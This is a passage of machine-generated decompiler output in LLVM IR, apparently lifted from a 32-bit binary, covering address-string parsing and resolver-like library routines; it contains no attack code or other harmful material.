  %v0_1000771c = phi i32 [ %v0_1000771c.pre, %dec_label_pc_100076e8.dec_label_pc_1000771c_crit_edge ], [ %v0_1000771c10, %dec_label_pc_10007694 ]
  %v3_1000771c = icmp eq i32 %v0_1000771c, 0
  br i1 %v3_1000771c, label %dec_label_pc_10007758, label %dec_label_pc_10007724

dec_label_pc_10007724:                            ; preds = %dec_label_pc_1000771c.thread, %dec_label_pc_1000771c
  %v0_10007724 = load i32, i32* %r12.global-to-local, align 4
  %v3_10007724 = icmp eq i32 %v0_10007724, 0
  %v0_10007734.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10007724, label %dec_label_pc_10007730, label %dec_label_pc_1000772c

dec_label_pc_1000772c:                            ; preds = %dec_label_pc_10007724
  %v1_1000772c = mul i32 %v0_10007734.pre, 256
  store i32 %v1_1000772c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007730

dec_label_pc_10007730:                            ; preds = %dec_label_pc_10007724, %dec_label_pc_1000772c
  %v0_10007734 = phi i32 [ %v1_1000772c, %dec_label_pc_1000772c ], [ %v0_10007734.pre, %dec_label_pc_10007724 ]
  %v0_10007730 = load i32, i32* %r11.global-to-local, align 4
  %v3_10007730 = icmp eq i32 %v0_10007730, 46
  %v1_10007734 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007734 = or i32 %v1_10007734, %v0_10007734
  store i32 %v2_10007734, i32* %r4.global-to-local, align 4
  br i1 %v3_10007730, label %dec_label_pc_1000773c, label %dec_label_pc_10007750

dec_label_pc_1000773c:                            ; preds = %dec_label_pc_10007730
  %v3_1000773c = icmp eq i32 %v0_10007724, 3
  %v1_10007740 = add i32 %v0_10007724, 1
  store i32 %v1_10007740, i32* %r12.global-to-local, align 4
  br i1 %v3_1000773c, label %dec_label_pc_10007758, label %dec_label_pc_10007748

dec_label_pc_10007748:                            ; preds = %dec_label_pc_1000773c
  %v0_10007748 = load i32, i32* @r3, align 4
  %v1_10007748 = add i32 %v0_10007748, 1
  store i32 %v1_10007748, i32* @r3, align 4
  br label %dec_label_pc_10007658

dec_label_pc_10007750:                            ; preds = %dec_label_pc_10007730
  %v3_10007750 = icmp eq i32 %v0_10007730, 0
  br i1 %v3_10007750, label %dec_label_pc_1000775c, label %dec_label_pc_10007758

dec_label_pc_10007758:                            ; preds = %dec_label_pc_1000773c, %dec_label_pc_1000771c, %dec_label_pc_100076d4, %dec_label_pc_100076f4, %dec_label_pc_10007750
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000775c

dec_label_pc_1000775c:                            ; preds = %dec_label_pc_10007750, %dec_label_pc_10007758
  %v0_1000775c = phi i32 [ %v2_10007734, %dec_label_pc_10007750 ], [ -1, %dec_label_pc_10007758 ]
  ret i32 %v0_1000775c

; uselistorder directives
  uselistorder i32 %v1_10007748, { 1, 0 }
  uselistorder i32 %v1_1000772c, { 1, 0 }
  uselistorder i32 %v0_10007734.pre, { 1, 0 }
  uselistorder i32 %v3_10007704, { 1, 2, 0 }
  uselistorder i32 %v0_100076f4, { 1, 2, 0 }
  uselistorder i32 %v0_10007698, { 1, 0 }
  uselistorder i32 %v0_1000766c, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000775c, { 1, 0 }
  uselistorder label %dec_label_pc_10007758, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10007730, { 1, 0 }
  uselistorder label %dec_label_pc_10007724, { 1, 0 }
  uselistorder label %dec_label_pc_1000771c, { 1, 0 }
  uselistorder label %dec_label_pc_100076f4, { 1, 0 }
  uselistorder label %dec_label_pc_100076a8, { 1, 0 }
  uselistorder label %dec_label_pc_10007694, { 2, 0, 1 }
}

define i32 @function_1000776c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000776c:
  %stack_var_-24 = alloca i32, align 4
  %v2_10007774 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007774, i32* @r4, align 4
  store i32 268466048, i32* @lr, align 4
  %v1_1000777c = bitcast i32* %stack_var_-24 to i8*
  %v2_1000777c = call i32 @function_1000a79c(i8* %v1_1000777c)
  %v3_10007780 = icmp eq i32 %v2_1000777c, 0
  br i1 %v3_10007780, label %dec_label_pc_10007790, label %dec_label_pc_1000778c

dec_label_pc_1000778c:                            ; preds = %dec_label_pc_1000776c
  %v3_1000778c = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10007790

dec_label_pc_10007790:                            ; preds = %dec_label_pc_1000776c, %dec_label_pc_1000778c
  %v0_1000779c = phi i32 [ -1, %dec_label_pc_1000776c ], [ %v3_1000778c, %dec_label_pc_1000778c ]
  ret i32 %v0_1000779c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007790, { 1, 0 }
}

define i32 @function_100077a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100077a0:
  %stack_var_-40 = alloca i32, align 4
  %v0_100077b4 = call i32 @function_1000954c()
  %v2_100077c4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268466140, i32* @lr, align 4
  %v7_100077d8 = call i32 @function_100077f4(i32 %arg1, i32* nonnull @global_var_10012ae0.249, i32 ptrtoint (i32* @global_var_10012914.250 to i32), i32 460, i32 %v2_100077c4, i32 %v0_100077b4)
  %v3_100077e0 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_100077e0
}

define i32 @function_100077f4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100077f4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_100077f8 = load i32, i32* @lr, align 4
  store i32 %v0_100077f8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_10007800 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_10007820 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_10007820, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_10007800, label %dec_label_pc_10007b24, label %dec_label_pc_1000782c

dec_label_pc_1000782c:                            ; preds = %dec_label_pc_100077f4
  %v0_1000782c = call i32 @function_10004b48()
  store i32 %v0_1000782c, i32* %r3.global-to-local, align 4
  %v1_10007834 = inttoptr i32 %v0_1000782c to i32*
  %v2_10007834 = load i32, i32* %v1_10007834, align 4
  store i32 %v2_10007834, i32* @r27, align 4
  store i32 %v0_1000782c, i32* %r28.global-to-local, align 4
  %v0_1000783c = load i32, i32* @r31, align 4
  store i32 %v0_1000783c, i32* %v1_10007834, align 4
  %v0_10007840 = load i32, i32* %r26.global-to-local, align 4
  %v0_10007844 = load i32, i32* @r23, align 4
  store i32 %v0_10007844, i32* %r3.global-to-local, align 4
  %v0_10007848 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000784c = load i32, i32* %r29.global-to-local, align 4
  %v0_10007850 = load i32, i32* %r20.global-to-local, align 4
  %v0_10007854 = load i32, i32* @r24, align 4
  store i32 268466268, i32* @lr, align 4
  %v7_10007858 = call i32 @function_1000b1cc(i32 %v0_10007844, i32 2, i32 %v0_10007840, i32 %v0_10007848, i32 %v0_1000784c, i32 %v0_10007850, i32 %v0_10007854)
  store i32 %v7_10007858, i32* %r3.global-to-local, align 4
  %v3_1000785c = icmp eq i32 %v7_10007858, 0
  br i1 %v3_1000785c, label %dec_label_pc_10007b24, label %dec_label_pc_10007864

dec_label_pc_10007864:                            ; preds = %dec_label_pc_1000782c
  %v0_10007864 = load i32, i32* @r24, align 4
  %v1_10007864 = inttoptr i32 %v0_10007864 to i32*
  %v2_10007864 = load i32, i32* %v1_10007864, align 4
  store i32 %v2_10007864, i32* %r0.global-to-local, align 4
  %v3_10007868 = icmp eq i32 %v2_10007864, 1
  br i1 %v3_10007868, label %dec_label_pc_1000788c, label %dec_label_pc_10007870

dec_label_pc_10007870:                            ; preds = %dec_label_pc_10007864
  %v3_10007870 = icmp eq i32 %v2_10007864, 4
  br i1 %v3_10007870, label %dec_label_pc_1000788c, label %dec_label_pc_10007878

dec_label_pc_10007878:                            ; preds = %dec_label_pc_10007870
  %v3_10007878 = icmp eq i32 %v2_10007864, -1
  br i1 %v3_10007878, label %dec_label_pc_10007880, label %dec_label_pc_10007b24

dec_label_pc_10007880:                            ; preds = %dec_label_pc_10007878
  %v0_10007880 = load i32, i32* @r28, align 4
  %v1_10007880 = inttoptr i32 %v0_10007880 to i32*
  %v2_10007880 = load i32, i32* %v1_10007880, align 4
  store i32 %v2_10007880, i32* %r0.global-to-local, align 4
  %v3_10007884 = icmp eq i32 %v2_10007880, 2
  br i1 %v3_10007884, label %dec_label_pc_1000788c, label %dec_label_pc_10007b24

dec_label_pc_1000788c:                            ; preds = %dec_label_pc_10007880, %dec_label_pc_10007870, %dec_label_pc_10007864
  %v0_1000788c = load i32, i32* @r30, align 4
  %v1_1000788c = sub i32 0, %v0_1000788c
  store i32 %v1_1000788c, i32* %r0.global-to-local, align 4
  %v0_10007890 = load i32, i32* @r27, align 4
  %v1_10007890 = load i32, i32* @r28, align 4
  %v2_10007890 = inttoptr i32 %v1_10007890 to i32*
  store i32 %v0_10007890, i32* %v2_10007890, align 4
  %v0_10007894 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007894 = urem i32 %v0_10007894, 4
  store i32 %v1_10007894, i32* %r0.global-to-local, align 4
  %v3_10007894 = icmp eq i32 %v1_10007894, 0
  %v0_100078ac.pre = load i32, i32* @r29, align 4
  br i1 %v3_10007894, label %dec_label_pc_100078ac, label %dec_label_pc_1000789c

dec_label_pc_1000789c:                            ; preds = %dec_label_pc_1000788c
  %v2_1000789c = icmp ult i32 %v0_100078ac.pre, %v1_10007894
  br i1 %v2_1000789c, label %dec_label_pc_10007b20, label %dec_label_pc_100078a4

dec_label_pc_100078a4:                            ; preds = %dec_label_pc_1000789c
  %v2_100078a4 = sub i32 %v0_100078ac.pre, %v1_10007894
  store i32 %v2_100078a4, i32* @r29, align 4
  %v0_100078a8 = load i32, i32* @r30, align 4
  %v2_100078a8 = add i32 %v0_100078a8, %v1_10007894
  store i32 %v2_100078a8, i32* @r30, align 4
  br label %dec_label_pc_100078ac

dec_label_pc_100078ac:                            ; preds = %dec_label_pc_1000788c, %dec_label_pc_100078a4
  %v0_100078ac = phi i32 [ %v2_100078a4, %dec_label_pc_100078a4 ], [ %v0_100078ac.pre, %dec_label_pc_1000788c ]
  %v1_100078b4 = load i32, i32* @r24, align 4
  %v2_100078b4 = inttoptr i32 %v1_100078b4 to i32*
  store i32 -1, i32* %v2_100078b4, align 4
  %tmp29 = icmp ult i32 %v0_100078ac, 4
  br i1 %tmp29, label %dec_label_pc_10007b20, label %dec_label_pc_100078bc

dec_label_pc_100078bc:                            ; preds = %dec_label_pc_100078ac
  %v0_100078bc = load i32, i32* @r29, align 4
  %v1_100078bc = add i32 %v0_100078bc, -4
  store i32 %v1_100078bc, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_100078bc, 8
  br i1 %tmp30, label %dec_label_pc_10007b20, label %dec_label_pc_100078c8

dec_label_pc_100078c8:                            ; preds = %dec_label_pc_100078bc
  %v1_100078c8 = add i32 %v0_100078bc, -12
  store i32 %v1_100078c8, i32* %r0.global-to-local, align 4
  %v0_100078cc = load i32, i32* @r30, align 4
  %v1_100078cc = add i32 %v0_100078cc, 4
  store i32 %v1_100078cc, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_100078d8 = inttoptr i32 %v1_100078cc to i32*
  store i32 %v0_100078cc, i32* %v3_100078d8, align 4
  %v0_100078dc = load i32, i32* %r28.global-to-local, align 4
  %v1_100078dc = load i32, i32* %r25.global-to-local, align 4
  %v2_100078dc = add i32 %v1_100078dc, 4
  %v3_100078dc = inttoptr i32 %v2_100078dc to i32*
  store i32 %v0_100078dc, i32* %v3_100078dc, align 4
  %tmp31 = icmp ult i32 %v1_100078c8, 32
  br i1 %tmp31, label %dec_label_pc_10007b20, label %dec_label_pc_100078e4

dec_label_pc_100078e4:                            ; preds = %dec_label_pc_100078c8
  %v0_100078e4 = load i32, i32* @r29, align 4
  %v1_100078e4 = add i32 %v0_100078e4, -44
  %tmp32 = icmp ult i32 %v1_100078e4, 256
  br i1 %tmp32, label %dec_label_pc_10007b20, label %dec_label_pc_100078f0

dec_label_pc_100078f0:                            ; preds = %dec_label_pc_100078e4
  %v0_100078f0 = load i32, i32* @r30, align 4
  %v1_100078f0 = add i32 %v0_100078f0, 44
  store i32 %v1_100078f0, i32* @r31, align 4
  %v0_100078f4 = load i32, i32* @r23, align 4
  store i32 %v0_100078f4, i32* @r4, align 4
  %v1_100078fc = add i32 %v0_100078f0, 12
  store i32 %v1_100078fc, i32* %r21.global-to-local, align 4
  store i32 %v1_100078f0, i32* %r3.global-to-local, align 4
  store i32 268466440, i32* @lr, align 4
  %v3_10007904 = call i32 @function_10007064(i32 %v1_100078f0, i32 %v0_100078f4, i32 %v1_100078e4)
  %v0_10007908 = load i32, i32* @r31, align 4
  %v1_10007908 = load i32, i32* @r30, align 4
  %v2_10007908 = add i32 %v1_10007908, 12
  %v3_10007908 = inttoptr i32 %v2_10007908 to i32*
  store i32 %v0_10007908, i32* %v3_10007908, align 4
  %v0_1000790c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000790c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000790c = add i32 %v1_1000790c, 4
  %v3_1000790c = inttoptr i32 %v2_1000790c to i32*
  store i32 %v0_1000790c, i32* %v3_1000790c, align 4
  %v0_10007910 = load i32, i32* @r23, align 4
  store i32 %v0_10007910, i32* %r3.global-to-local, align 4
  %v0_10007914 = load i32, i32* @r30, align 4
  store i32 %v0_10007914, i32* @r4, align 4
  store i32 268466460, i32* @lr, align 4
  %v2_10007918 = inttoptr i32 %v0_10007910 to i8*
  %v3_10007918 = call i32 @function_1000a79c(i8* %v2_10007918)
  store i32 %v3_10007918, i32* %r3.global-to-local, align 4
  store i32 %v3_10007918, i32* %r22.global-to-local, align 4
  %v3_1000791c = icmp eq i32 %v3_10007918, 0
  br i1 %v3_1000791c, label %dec_label_pc_10007950, label %dec_label_pc_10007924

dec_label_pc_10007924:                            ; preds = %dec_label_pc_100078f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000792c = load i32, i32* @r26, align 4
  %v2_1000792c = add i32 %v1_1000792c, 8
  %v3_1000792c = inttoptr i32 %v2_1000792c to i32*
  store i32 2, i32* %v3_1000792c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10007934 = load i32, i32* @r31, align 4
  %v1_10007934 = load i32, i32* @r26, align 4
  %v2_10007934 = inttoptr i32 %v1_10007934 to i32*
  store i32 %v0_10007934, i32* %v2_10007934, align 4
  %v0_10007938 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007938 = load i32, i32* @r26, align 4
  %v2_10007938 = add i32 %v1_10007938, 12
  %v3_10007938 = inttoptr i32 %v2_10007938 to i32*
  store i32 %v0_10007938, i32* %v3_10007938, align 4
  %v0_1000793c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000793c = load i32, i32* @r26, align 4
  %v2_1000793c = add i32 %v1_1000793c, 16
  %v3_1000793c = inttoptr i32 %v2_1000793c to i32*
  store i32 %v0_1000793c, i32* %v3_1000793c, align 4
  %v0_10007940 = load i32, i32* %r21.global-to-local, align 4
  %v1_10007940 = load i32, i32* @r26, align 4
  %v2_10007940 = add i32 %v1_10007940, 4
  %v3_10007940 = inttoptr i32 %v2_10007940 to i32*
  store i32 %v0_10007940, i32* %v3_10007940, align 4
  %v0_10007944 = load i32, i32* @r26, align 4
  %v1_10007944 = load i32, i32* @r20, align 4
  %v2_10007944 = inttoptr i32 %v1_10007944 to i32*
  store i32 %v0_10007944, i32* %v2_10007944, align 4
  %v0_10007948 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007948 = load i32, i32* @r24, align 4
  %v2_10007948 = inttoptr i32 %v1_10007948 to i32*
  store i32 %v0_10007948, i32* %v2_10007948, align 4
  br label %dec_label_pc_10007b24

dec_label_pc_10007950:                            ; preds = %dec_label_pc_100078f0
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268466520, i32* @lr, align 4
  %v0_10007954 = call i32 @function_1000aef8()
  store i32 ptrtoint (i32* @global_var_100103e0.251 to i32), i32* %r29.global-to-local, align 4
  %v2_1000795c = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000795c, i32* %r28.global-to-local, align 4
  store i32 %v2_1000795c, i32* @r3, align 4
  %v0_10007970 = call i32 @function_10008c80()
  store i32 ptrtoint (i32* @global_var_100103e0.251 to i32), i32* %r3.global-to-local, align 4
  %v0_10007978 = call i32 @function_10008c78()
  %v3_10007980 = load i32, i32* @global_var_100104c8.252, align 4
  store i32 %v3_10007980, i32* %r29.global-to-local, align 4
  store i32 %v2_1000795c, i32* @r3, align 4
  %v0_1000798c = call i32 @function_10008c80()
  %v0_10007994 = load i32, i32* @r23, align 4
  store i32 %v0_10007994, i32* %r3.global-to-local, align 4
  %v2_100079a4 = ptrtoint i32* %stack_var_-120 to i32
  %v2_100079a8 = ptrtoint i32* %stack_var_-100 to i32
  %v0_100079ac = load i32, i32* %r22.global-to-local, align 4
  store i32 268466620, i32* @lr, align 4
  %v6_100079b8 = inttoptr i32 %v0_10007994 to i8*
  %v7_100079b8 = call i32 @function_1000a85c(i8* %v6_100079b8, i32 1, i32 %v3_10007980, i32 ptrtoint (i32* @global_var_10012d4c.253 to i32), i32 %v2_100079a4, i32 %v2_100079a8)
  store i32 %v7_100079b8, i32* %r3.global-to-local, align 4
  %v1_100079bc = icmp slt i32 %v7_100079b8, 0
  br i1 %v1_100079bc, label %dec_label_pc_10007b04, label %dec_label_pc_100079c4

dec_label_pc_100079c4:                            ; preds = %dec_label_pc_10007950
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_100079cc = add i32 %tmp19, 4
  %v2_100079d0 = mul i32 %v0_100079ac, %v1_100079cc
  %v1_100079d4 = add i32 %v2_100079d0, 256
  %v1_100079d8 = load i32, i32* @r27, align 4
  %v3_100079d8 = icmp ugt i32 %v1_100079d4, %v1_100079d8
  br i1 %v3_100079d8, label %dec_label_pc_100079e0, label %dec_label_pc_100079fc

dec_label_pc_100079e0:                            ; preds = %dec_label_pc_100079c4
  %v3_100079e0 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_100079e0, i32* %r3.global-to-local, align 4
  store i32 268466664, i32* @lr, align 4
  %v1_100079e4 = call i32 @function_10007e44(i32 %v3_100079e0)
  %v3_100079e8 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100079e8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100079f0.254 to i32), i32* @lr, align 4
  %v1_100079ec = call i32 @function_10007e44(i32 %v3_100079e8)
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_100079f4 = load i32, i32* @r19, align 4
  %v1_100079f4 = load i32, i32* @r24, align 4
  %v2_100079f4 = inttoptr i32 %v1_100079f4 to i32*
  store i32 %v0_100079f4, i32* %v2_100079f4, align 4
  br label %dec_label_pc_10007b24

dec_label_pc_100079fc:                            ; preds = %dec_label_pc_100079c4
  %v3_100079fc = icmp eq i32 %v0_100079ac, 0
  br i1 %v3_100079fc, label %dec_label_pc_100079fc.dec_label_pc_10007aa0_crit_edge, label %dec_label_pc_10007a04

dec_label_pc_100079fc.dec_label_pc_10007aa0_crit_edge: ; preds = %dec_label_pc_100079fc
  %v0_10007aa8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007aa0

dec_label_pc_10007a04:                            ; preds = %dec_label_pc_100079fc
  %v2_10007a04 = mul i32 %v0_100079ac, %tmp19
  store i32 %v2_10007a04, i32* @r5, align 4
  %v0_10007a08 = load i32, i32* @r30, align 4
  %v1_10007a08 = add i32 %v0_10007a08, 36
  store i32 %v1_10007a08, i32* %r3.global-to-local, align 4
  %v0_10007a0c = load i32, i32* @r31, align 4
  store i32 268466708, i32* @lr, align 4
  %v2_10007a10 = call i32 @function_1000a3ec(i32 %v1_10007a08, i32 %v0_10007a0c)
  store i32 %v2_10007a10, i32* %r3.global-to-local, align 4
  store i32 %v2_10007a04, i32* %r0.global-to-local, align 4
  %v0_10007a20 = load i32, i32* @r30, align 4
  %v1_10007a20 = load i32, i32* @r31, align 4
  %v3_10007a20 = add i32 %v1_10007a20, %v2_10007a04
  %v4_10007a20 = inttoptr i32 %v3_10007a20 to i32*
  store i32 %v0_10007a20, i32* %v4_10007a20, align 4
  %v0_10007a24 = load i32, i32* @r31, align 4
  %v1_10007a24 = load i32, i32* %r0.global-to-local, align 4
  %v2_10007a24 = add i32 %v1_10007a24, %v0_10007a24
  store i32 %v2_10007a24, i32* @r25, align 4
  %v1_10007a2c = add i32 %v0_100079ac, -1
  store i32 %v1_10007a2c, i32* %r11.global-to-local, align 4
  %v1_10007a30 = add i32 %v0_100079ac, 1
  %v2_10007a34 = icmp sgt i32 %v1_10007a2c, -1
  store i32 %v1_10007a30, i32* %ctr.global-to-local, align 4
  br i1 %v2_10007a34, label %dec_label_pc_10007a64.preheader, label %dec_label_pc_10007a40

dec_label_pc_10007a40:                            ; preds = %dec_label_pc_10007a04
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007a64.preheader

dec_label_pc_10007a64.preheader:                  ; preds = %dec_label_pc_10007a40, %dec_label_pc_10007a04
  %v0_10007a6c6 = phi i32 [ 1, %dec_label_pc_10007a40 ], [ %v1_10007a30, %dec_label_pc_10007a04 ]
  %v1_10007a643 = mul i32 %v1_10007a2c, 4
  store i32 %v1_10007a643, i32* %r0.global-to-local, align 4
  %v2_10007a685 = add i32 %v2_10007a24, %v1_10007a643
  %v1_10007a6c7 = add i32 %v0_10007a6c6, -1
  store i32 %v1_10007a6c7, i32* %ctr.global-to-local, align 4
  %v2_10007a6c8 = icmp eq i32 %v1_10007a6c7, 0
  br i1 %v2_10007a6c8, label %dec_label_pc_10007a70, label %dec_label_pc_10007a4c

dec_label_pc_10007a4c:                            ; preds = %dec_label_pc_10007a64.preheader, %dec_label_pc_10007a4c.dec_label_pc_10007a4c_crit_edge
  %v1_10007a60 = phi i32 [ %v2_10007a68, %dec_label_pc_10007a4c.dec_label_pc_10007a4c_crit_edge ], [ %v2_10007a685, %dec_label_pc_10007a64.preheader ]
  %v0_10007a58 = phi i32 [ %v0_10007a58.pre, %dec_label_pc_10007a4c.dec_label_pc_10007a4c_crit_edge ], [ %v0_10007a24, %dec_label_pc_10007a64.preheader ]
  %v0_10007a50 = phi i32 [ %v0_10007a64, %dec_label_pc_10007a4c.dec_label_pc_10007a4c_crit_edge ], [ %v1_10007a2c, %dec_label_pc_10007a64.preheader ]
  %v2_10007a50 = mul i32 %v0_10007a50, %tmp19
  %v1_10007a54 = add i32 %v0_10007a50, -1
  store i32 %v1_10007a54, i32* %r11.global-to-local, align 4
  %v2_10007a58 = add i32 %v0_10007a58, -8
  %v1_10007a5c = add i32 %v2_10007a58, %v2_10007a50
  %v2_10007a60 = add i32 %v1_10007a60, 4
  %v3_10007a60 = inttoptr i32 %v2_10007a60 to i32*
  store i32 %v1_10007a5c, i32* %v3_10007a60, align 4
  %v0_10007a64 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007a64 = mul i32 %v0_10007a64, 4
  store i32 %v1_10007a64, i32* %r0.global-to-local, align 4
  %v1_10007a68 = load i32, i32* @r25, align 4
  %v0_10007a6c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007a6c = add i32 %v0_10007a6c, -1
  store i32 %v1_10007a6c, i32* %ctr.global-to-local, align 4
  %v2_10007a6c = icmp eq i32 %v1_10007a6c, 0
  br i1 %v2_10007a6c, label %dec_label_pc_10007a70, label %dec_label_pc_10007a4c.dec_label_pc_10007a4c_crit_edge

dec_label_pc_10007a4c.dec_label_pc_10007a4c_crit_edge: ; preds = %dec_label_pc_10007a4c
  %v2_10007a68 = add i32 %v1_10007a68, %v1_10007a64
  %v0_10007a58.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007a4c

dec_label_pc_10007a70:                            ; preds = %dec_label_pc_10007a4c, %dec_label_pc_10007a64.preheader
  %v1_10007a7c = phi i32 [ %v2_10007a24, %dec_label_pc_10007a64.preheader ], [ %v1_10007a68, %dec_label_pc_10007a4c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10007a78 = mul i32 %v0_100079ac, 4
  %v2_10007a7c = add i32 %v1_10007a78, 4
  %v2_10007a80 = add i32 %v2_10007a7c, %v1_10007a7c
  %v3_10007a80 = inttoptr i32 %v2_10007a80 to i32*
  store i32 0, i32* %v3_10007a80, align 4
  %v0_10007a8c = load i32, i32* @r25, align 4
  %v2_10007a8c = add i32 %v0_10007a8c, %v1_10007a78
  store i32 %v2_10007a8c, i32* %r11.global-to-local, align 4
  %v1_10007a90 = load i32, i32* @r31, align 4
  %v2_10007a90 = sub i32 %v1_10007a90, %v2_10007a8c
  %v1_10007a94 = add i32 %v2_10007a8c, 8
  store i32 %v1_10007a94, i32* @r31, align 4
  %v0_10007a98 = load i32, i32* @r27, align 4
  %v2_10007a98 = add i32 %v0_10007a98, %v2_10007a90
  %v1_10007a9c = add i32 %v2_10007a98, -8
  br label %dec_label_pc_10007aa0

dec_label_pc_10007aa0:                            ; preds = %dec_label_pc_100079fc.dec_label_pc_10007aa0_crit_edge, %dec_label_pc_10007a70
  %v0_10007aa8 = phi i32 [ %v0_10007aa8.pre, %dec_label_pc_100079fc.dec_label_pc_10007aa0_crit_edge ], [ %v1_10007a94, %dec_label_pc_10007a70 ]
  %v0_10007aa4 = phi i32 [ %v1_100079d8, %dec_label_pc_100079fc.dec_label_pc_10007aa0_crit_edge ], [ %v1_10007a9c, %dec_label_pc_10007a70 ]
  %v3_10007aa0 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007aa0, i32* @r4, align 4
  store i32 %v0_10007aa8, i32* %r3.global-to-local, align 4
  store i32 268466864, i32* @lr, align 4
  %v3_10007aac = call i32 @function_10007064(i32 %v0_10007aa8, i32 %v3_10007aa0, i32 %v0_10007aa4)
  %v3_10007ab0 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007ab0, i32* %r3.global-to-local, align 4
  store i32 268466872, i32* @lr, align 4
  %v1_10007ab4 = call i32 @function_10007e44(i32 %v3_10007ab0)
  store i32 %v1_10007ab4, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10007abc = icmp eq i32 %tmp18, 1
  br i1 %v3_10007abc, label %dec_label_pc_10007ac4, label %dec_label_pc_10007b0c

dec_label_pc_10007ac4:                            ; preds = %dec_label_pc_10007aa0
  store i32 4, i32* @r5, align 4
  %v0_10007acc = load i32, i32* @r30, align 4
  store i32 %v0_10007acc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007ad4.255 to i32), i32* @lr, align 4
  %v0_10007ad0 = call i32 @function_10006d88()
  %v1_10007ad8 = load i32, i32* @r26, align 4
  %v2_10007ad8 = add i32 %v1_10007ad8, 8
  %v3_10007ad8 = inttoptr i32 %v2_10007ad8 to i32*
  store i32 2, i32* %v3_10007ad8, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10007ae0 = load i32, i32* @r26, align 4
  %v2_10007ae0 = add i32 %v1_10007ae0, 12
  %v3_10007ae0 = inttoptr i32 %v2_10007ae0 to i32*
  store i32 4, i32* %v3_10007ae0, align 4
  %v0_10007ae4 = load i32, i32* @r31, align 4
  %v1_10007ae4 = load i32, i32* @r26, align 4
  %v2_10007ae4 = inttoptr i32 %v1_10007ae4 to i32*
  store i32 %v0_10007ae4, i32* %v2_10007ae4, align 4
  %v0_10007ae8 = load i32, i32* @r25, align 4
  %v1_10007ae8 = load i32, i32* @r26, align 4
  %v2_10007ae8 = add i32 %v1_10007ae8, 16
  %v3_10007ae8 = inttoptr i32 %v2_10007ae8 to i32*
  store i32 %v0_10007ae8, i32* %v3_10007ae8, align 4
  %v0_10007aec = load i32, i32* @r21, align 4
  %v1_10007aec = load i32, i32* @r26, align 4
